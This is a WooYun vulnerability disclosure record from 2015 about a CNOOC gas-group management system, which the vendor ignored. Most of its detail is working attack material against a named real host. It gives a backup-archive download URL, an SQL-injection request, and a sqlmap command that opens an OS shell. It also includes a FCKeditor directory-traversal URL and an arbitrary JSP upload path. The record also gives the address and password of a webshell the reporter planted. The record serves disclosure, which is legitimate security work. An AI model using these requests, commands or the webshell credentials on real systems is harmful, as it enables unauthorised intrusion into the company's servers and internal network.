{"id": 67637, "wybug_id": "wooyun-2015-0152023", "wybug_title": "中海石油气电集团某系统漏洞打包可威胁内网（sql注入、文件上传、目录遍历等）", "wybug_corp": "中国海洋石油总公司", "wybug_author": "路人甲", "wybug_date": "2015-11-05 14:04", "wybug_open_date": "2015-11-10 14:04", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-10：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： sql注入、文件上传、目录遍历等，求上一次首页 详细说明：  \n\n1#备份文件下载http://gte.cnoocgas.com:8080/gfmis/gfmis.war.rar2#登录口存在注入\nGET http://gte.cnoocgas.com:8080/gfmis/checkusercodelevel.jsp?verifyCode=6619&userid=admin HTTP/1.1Accept: text/html, application/xhtml+xml, */*Referer: http://gte.cnoocgas.com:8080/gfmis/Accept-Language: zh-CNUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)Accept-Encoding: gzip, deflateHost: gte.cnoocgas.com:8080Connection: Keep-AliveCookie: JSESSIONID=7C51828E2BE5287E0DAFCAB5C28979AD\n丢sqlmap跑表即可python SQLMap/SQLMap.py -r 3.txt --time-sec 6 --dbms \"Microsoft SQL Server\" --os-shell\n\n\n\nsa权限，支持os-shell，可以写shell\n\n   漏洞证明：  3#fck编辑器目录遍历\nhttp://gte.cnoocgas.com:8080/gfmis/FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=&CurrentFolder=/../\n\n\n\n\n4#fck任意文件上传\nhttp://gte.cnoocgas.com:8080/gfmis/FCKeditor/editor/filemanager/browser/default/browser.html?Connector=connectors/jsp/connector\n直接上传jsp文件\n\n一句话地址：http://gte.cnoocgas.com:8080/gfmis/UserFiles/File/wpp.jsp密码：wpppandas\n\n\n\n\n\n   修复方案：  需要整改的地方有点多，参数化查询，删除备份文件，正确配置fck编辑器   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-11-10 14:04 厂商回复：  漏洞Rank：4  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}